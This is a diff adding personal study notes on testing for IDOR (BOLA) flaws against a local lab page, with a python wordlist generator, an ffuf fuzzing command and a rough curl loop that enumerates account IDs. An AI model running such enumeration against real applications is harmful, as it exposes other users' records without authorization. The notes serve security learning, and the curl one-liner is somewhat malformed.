@@ -323,3 +323,33 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
 
 - [ ] IDOR
 
+```
+And this vulnerablity is fairly trivial to find and exploit and we actually see a lot of API driven applications though in that situation we actually call it BOLA (i.e. broken objects level authorization.)
+
+So BOLA and IDOR are basically the same vulnerability.
+```
+
+
+The easiest way to test for IDOR is essentially find a point where you're able to manipulate an object's ID and than simply change it.
+
+```
+Will make a file name num.txt using python command from number 1 to 2001
+ python3 -c "for i in range (1,2001): print(i)" > num.txt
+```
+
+
+Now will simply pass the num.txt file through the URL using the FFUF and filter using size we get less entries as output which is good as earlier we were getting false positive.
+
+```
+ffuf -u "http://localhost/labs/e0x02.php?account=FUZZ" -w num.txt -fs 849 
+```
+
+
+I made the one lines script but it needs some if and else to get add in the output.
+
+```
+for i in `cat $file`;do curl -v --silent http://localhost/labs/e0x02.php?account="$i" 2>&1 | grep Type + echo "$i">> put.txt;done; 
+```
+
+
+
